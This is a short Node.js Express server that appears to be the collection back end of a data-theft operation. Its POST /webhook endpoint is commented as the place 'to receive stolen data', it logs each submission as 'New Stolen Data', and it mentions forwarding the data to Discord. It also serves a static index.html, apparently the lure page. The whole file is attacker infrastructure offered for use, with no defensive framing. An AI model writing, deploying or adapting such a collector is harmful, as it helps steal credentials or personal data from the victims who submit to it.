const express = require('express');
const app = express();
app.use(express.json());
app.use(express.static('.')); // Serve index.html

// Endpoint to receive stolen data
app.post('/webhook', (req, res) => {
    const data = req.body;
    console.log("🔥 New Stolen Data:", data);
    
    // Optional: Log to a file or send to Discord embed here
    res.json({ status: "ok" });
});

app.listen(process.env.PORT || 3000, () => {
    console.log('Server running on port ' + process.env.PORT);
});